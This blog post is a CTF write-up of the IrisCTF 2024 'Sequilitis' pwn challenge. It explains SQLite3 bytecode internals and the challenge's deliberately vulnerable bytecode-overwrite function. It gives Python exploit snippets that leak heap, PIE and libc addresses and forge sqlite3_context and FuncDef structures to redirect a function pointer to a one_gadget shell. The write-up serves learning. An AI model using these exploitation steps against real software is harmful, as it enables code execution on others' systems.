<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Introduction I played IrisCTF last week and found Sequilitis really interesting. Although I wasn&rsquo;t able to solve it during the CTF, I worked on it afterward. The challenge uses the SQLite3 engine, so we need to understand SQLite3 internals before diving into the challenge. Sqlite3 Internals SQLite3 uses a bytecode engine. First, it translates SQL statements into bytecode, and then the generated bytecode runs in a VM. Each instruction is 24 bytes, i.">
<title>IrisCTF 2024 - Sequilitis</title>

<link rel='canonical' href='http://localhost:1313/post/irisctf_sequilitis/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="IrisCTF 2024 - Sequilitis">
<meta property='og:description' content="Introduction I played IrisCTF last week and found Sequilitis really interesting. Although I wasn&rsquo;t able to solve it during the CTF, I worked on it afterward. The challenge uses the SQLite3 engine, so we need to understand SQLite3 internals before diving into the challenge. Sqlite3 Internals SQLite3 uses a bytecode engine. First, it translates SQL statements into bytecode, and then the generated bytecode runs in a VM. Each instruction is 24 bytes, i.">
<meta property='og:url' content='http://localhost:1313/post/irisctf_sequilitis/'>
<meta property='og:site_name' content='spektre&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='IrisCTF2024' /><meta property='article:tag' content='Sqlite3' /><meta property='article:tag' content='Binary Exploitation' /><meta property='article:published_time' content='2024-01-13T14:02:58&#43;05:30'/><meta property='article:modified_time' content='2024-01-13T14:02:58&#43;05:30'/>
<meta name="twitter:title" content="IrisCTF 2024 - Sequilitis">
<meta name="twitter:description" content="Introduction I played IrisCTF last week and found Sequilitis really interesting. Although I wasn&rsquo;t able to solve it during the CTF, I worked on it afterward. The challenge uses the SQLite3 engine, so we need to understand SQLite3 internals before diving into the challenge. Sqlite3 Internals SQLite3 uses a bytecode engine. First, it translates SQL statements into bytecode, and then the generated bytecode runs in a VM. Each instruction is 24 bytes, i.">
    <link rel="shortcut icon" href="/img/favicon.png" />

  


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "dark");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column compact"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/hinata_hu13819647778857511344.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">spektre&#39;s Blog</a></h1>
            <h2 class="site-description">CTF Player | Pwn | messing with js engines</h2>
        </div>
    </header><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/about/' >
                
                
                
                <span>About</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    

            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf-writeup/" >
                CTF Writeup
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/post/irisctf_sequilitis/">IrisCTF 2024 - Sequilitis</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jan 13, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    5 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h3 id="introduction">Introduction
</h3><p>I played IrisCTF last week and found Sequilitis really interesting. Although I wasn&rsquo;t able to solve it during the CTF, I worked on it afterward. The challenge uses the SQLite3 engine, so we need to understand SQLite3 internals before diving into the challenge.</p>
<h3 id="sqlite3-internals">Sqlite3 Internals
</h3><p>SQLite3 uses a bytecode engine. First, it translates SQL statements into bytecode, and then the generated bytecode runs in a VM. Each instruction is 24 bytes, i.e., 6 ints. The opcode takes the first 4 bytes, and the arguments take the rest. To take a look at the bytecode, we can use the <code>Explain</code> keyword, which gives us the bytecode of the SQL statement instead of executing it in the VM.</p>
<p><img src="/IrisCTF2024/bytecode.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>You can take a look at all the opcodes <a class="link" href="https://www.sqlite.org/opcode.html#the_opcodes"  target="_blank" rel="noopener"
    >here</a>.</p>
<h3 id="bug-analysis">Bug Analysis
</h3><p>The challenge essentially involves four things:</p>
<ol>
<li>Adding a query.</li>
<li>Executing the query.</li>
<li>Deleting the query.</li>
<li>Exiting.</li>
</ol>
<p>The functionality is pretty straightforward, but there is a hidden function called <code>inscribe()</code>, which is where the bug lies.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">inscribe</span>(sqlite3_stmt <span style="color:#f92672">**</span>stmt) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">*</span>stmt <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;There is no prepared statement at this location.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> amount <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>stmt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x90</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>tome <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>stmt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x88</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;How many characters will you inscribe (up to %d)? &#34;</span>, amount <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> actual <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>actual);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(actual <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> actual <span style="color:#f92672">&gt;</span> amount <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Invalid amount.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Inscribe your message: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> actual; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>tome <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>tome;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">It has been done.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The function takes the query index as the input and then allows us to overwrite the bytecode of that query.</p>
<h3 id="getting-leaks">Getting Leaks
</h3><p>We know from the bytecode that the engine only handles 32-bit values. But how does it handle values that exceed this limit? The answer is that it uses pointers instead. For the query <code>select 0x1122334455</code>, this is the memory layout of the bytecode:</p>
<p><img src="/IrisCTF2024/img1.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>It handles queries like <code>SELECT 1.1</code> in the same way.</p>
<p>Now, what if we overwrite the last byte of the pointer with an address that points to some useful heap location? This would result in a heap leak. By exploiting this heap leak, we can achieve arbitrary read access on the heap. Utilizing this, we can leak the PIE address and then leak the printf GOT to obtain the libc address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_val</span>(addr):
</span></span><span style="display:flex;"><span>¬† ¬† bytecode <span style="color:#f92672">=</span> generate_opcode(<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">72</span>) <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">243</span>) <span style="color:#f92672">+</span> p16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> addr
</span></span><span style="display:flex;"><span>¬† ¬† sl(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> str(len(bytecode))<span style="color:#f92672">.</span>encode());
</span></span><span style="display:flex;"><span>¬† ¬† sl(bytecode)
</span></span><span style="display:flex;"><span>¬† ¬† sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;It has been done.&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>¬† ¬† sl(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>¬† ¬† ru(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;? &#34;</span>)
</span></span><span style="display:flex;"><span>¬† ¬† <span style="color:#66d9ef">return</span> int(rl()<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>heap <span style="color:#f92672">=</span> leak_val(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe0</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>heap <span style="color:#f92672">=</span> heap <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xe008</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;heap --&gt; &#34;</span> <span style="color:#f92672">+</span> hex(heap))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>baseleak <span style="color:#f92672">=</span> leak_val(p64(heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x640</span>))
</span></span><span style="display:flex;"><span>base_addr <span style="color:#f92672">=</span> baseleak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xe3d87</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;base addr --&gt; &#34;</span> <span style="color:#f92672">+</span> hex(base_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printf <span style="color:#f92672">=</span> leak_val(p64(base_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x11aed8</span>))
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> printf <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x606f0</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc --&gt; &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
</span></span></code></pre></div><p>Now that we have all the leaks we need, We have to figure out how to get RIP control.</p>
<h3 id="getting-rip-control">Getting RIP Control
</h3><p>After looking at the opcodes, We can see that <code>function</code> opcode can help us get RIP control.</p>
<p>Here is the opcode description for <code>Function</code>:</p>
<pre tabindex="0"><code>Invoke a user function (P4 is a pointer to an sqlite3_context object that contains a pointer to the function to be run) with arguments taken from register P2 and successors. The number of arguments is in the sqlite3_context object that P4 points to. The result of the function is stored in register P3. Register P3 must not be one of the function inputs.&lt;br&gt;&lt;br&gt;P1 is a 32-bit bitmask indicating whether or not each argument to the function was determined to be constant at compile time. If the first argument was constant then bit 0 of P1 is set. This is used to determine whether meta data associated with a user function argument using the sqlite3_set_auxdata() API may be safely retained until the next invocation of this opcode.|
</code></pre><p>Here are some useful structs:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> sqlite3_context {
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>pOut;              <span style="color:#75715e">/* The return value is stored here */</span>
</span></span><span style="display:flex;"><span>  FuncDef <span style="color:#f92672">*</span>pFunc;         <span style="color:#75715e">/* Pointer to function information */</span>
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>pMem;              <span style="color:#75715e">/* Memory cell used to store aggregate context */</span>
</span></span><span style="display:flex;"><span>  Vdbe <span style="color:#f92672">*</span>pVdbe;            <span style="color:#75715e">/* The VM that owns this context */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iOp;                <span style="color:#75715e">/* Instruction number of OP_Function */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> isError;            <span style="color:#75715e">/* Error code returned by the function. */</span>
</span></span><span style="display:flex;"><span>  u8 enc;                 <span style="color:#75715e">/* Encoding to use for results */</span>
</span></span><span style="display:flex;"><span>  u8 skipFlag;            <span style="color:#75715e">/* Skip accumulator loading if true */</span>
</span></span><span style="display:flex;"><span>  u8 argc;                <span style="color:#75715e">/* Number of arguments */</span>
</span></span><span style="display:flex;"><span>  sqlite3_value <span style="color:#f92672">*</span>argv[<span style="color:#ae81ff">1</span>]; <span style="color:#75715e">/* Argument set */</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> FuncDef {
</span></span><span style="display:flex;"><span>  i8 nArg;             <span style="color:#75715e">/* Number of arguments.  -1 means unlimited */</span>
</span></span><span style="display:flex;"><span>  u32 funcFlags;       <span style="color:#75715e">/* Some combination of SQLITE_FUNC_* */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pUserData;     <span style="color:#75715e">/* User data parameter */</span>
</span></span><span style="display:flex;"><span>  FuncDef <span style="color:#f92672">*</span>pNext;      <span style="color:#75715e">/* Next function with same name */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>xSFunc)(sqlite3_context<span style="color:#f92672">*</span>,<span style="color:#66d9ef">int</span>,sqlite3_value<span style="color:#f92672">**</span>); <span style="color:#75715e">/* func or agg-step */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>xFinalize)(sqlite3_context<span style="color:#f92672">*</span>);                  <span style="color:#75715e">/* Agg finalizer */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>xValue)(sqlite3_context<span style="color:#f92672">*</span>);                     <span style="color:#75715e">/* Current agg value */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>xInverse)(sqlite3_context<span style="color:#f92672">*</span>,<span style="color:#66d9ef">int</span>,sqlite3_value<span style="color:#f92672">**</span>); <span style="color:#75715e">/* inverse agg-step */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>zName;   <span style="color:#75715e">/* SQL name of the function. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">union</span> {
</span></span><span style="display:flex;"><span>    FuncDef <span style="color:#f92672">*</span>pHash;      <span style="color:#75715e">/* Next with a different name but the same hash */</span>
</span></span><span style="display:flex;"><span>    FuncDestructor <span style="color:#f92672">*</span>pDestructor;   <span style="color:#75715e">/* Reference counted destructor function */</span>
</span></span><span style="display:flex;"><span>  } u; <span style="color:#75715e">/* pHash if SQLITE_FUNC_BUILTIN, pDestructor otherwise */</span>
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>If we fake these structures and overwrite the function pointer with a one_gadget, it will spawn a shell. To achieve this, we need to craft a fake <code>sqlite3_context</code> that points to a fake <code>FuncDef</code>. This <code>FuncDef</code> must contain the target pointer.</p>
<p>Fake sqlite3_context:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(ptr1<span style="color:#f92672">+</span><span style="color:#ae81ff">0x38</span>) <span style="color:#75715e">#FuncDef *pFunc; which is now our controlled pointer.</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(ptr1<span style="color:#f92672">+</span><span style="color:#ae81ff">0x64</span>) <span style="color:#75715e">#nulls</span>
</span></span></code></pre></div><p>Fake FuncDef:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p16(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(oneGadget) <span style="color:#75715e"># func* xSFunc --&gt; out target function ptr </span>
</span></span></code></pre></div><p>Now that we have the fake structures ready, we will write them into memory by editing a query (1). Then, we&rsquo;ll make another query (2) to overwrite it with a function call, and subsequently execute it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>edit_query(<span style="color:#ae81ff">1</span>, len(payload), payload)
</span></span><span style="display:flex;"><span>new_query(<span style="color:#ae81ff">2</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;SELECT 1.0&#34;</span>)
</span></span><span style="display:flex;"><span>bytecode <span style="color:#f92672">=</span> generate_opcode(<span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, ptr1)
</span></span><span style="display:flex;"><span>edit_query(<span style="color:#ae81ff">2</span>, len(bytecode), bytecode)
</span></span><span style="display:flex;"><span>exec_query(<span style="color:#ae81ff">2</span>)
</span></span></code></pre></div><p>This should spawn us a shell!</p>
<p><img src="/IrisCTF2024/img2.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>You can find challenge files and exploit script <a class="link" href="https://github.com/SanjayVardhan/pwn/tree/main/Origin/CTFs/IrisCTF2024/sequilitis"  target="_blank" rel="noopener"
    >here</a></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/irisctf2024/">IrisCTF2024</a>
        
            <a href="/tags/sqlite3/">Sqlite3</a>
        
            <a href="/tags/binary-exploitation/">Binary Exploitation</a>
        
    </section>


    </footer>


    
</article>

    

    

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2024 - 
        
        2025 spektre&#39;s Blog
    </section>
    
    <section class="powerby">
        
            ¬© 2025 spektre. All rights reserved. <br/>
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.c4c6f77d20c3a4b8c34274cb3cea4603317114a7a5df549091aa546fa8b95e16.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
